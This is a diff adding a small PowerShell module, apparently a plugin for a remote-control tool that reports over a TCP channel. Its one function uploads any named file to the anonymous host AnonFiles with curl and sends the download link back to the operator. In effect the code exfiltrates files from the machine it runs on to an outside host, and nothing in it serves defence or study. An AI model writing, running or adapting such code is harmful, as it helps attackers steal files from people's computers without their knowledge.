@@ -1,0 +1,15 @@
+﻿#AnonFilesAPI
+#1.1
+#@{"anonupload" = "<FileName> uploads a file to AnonFiles"}
+#""
+
+function anonupload ($anonuploadfile)
+{
+	$anonuploadfile = $anonuploadfile.Replace("~", " ")
+	$anondownloadlink= cmd /c "curl -F "file=@$anonuploadfile" https://api.anonfiles.com/upload" | Select-String "full" -ErrorAction SilentlyContinue
+	
+	if ($anondownloadlink -ne $null) {WriteTCPMessage ("`nDownload Here: " + ([string]$anondownloadlink).Replace('"full":', "").Replace("\/", "/").Replace('"', "").Replace(",", "").Substring(5) + "`n")}
+	else {WriteTCPMessage "`nNo Such File!`n"}
+	
+	Remove-Variable anonuploadfile, anondownloadlink -ErrorAction SilentlyContinue
+}
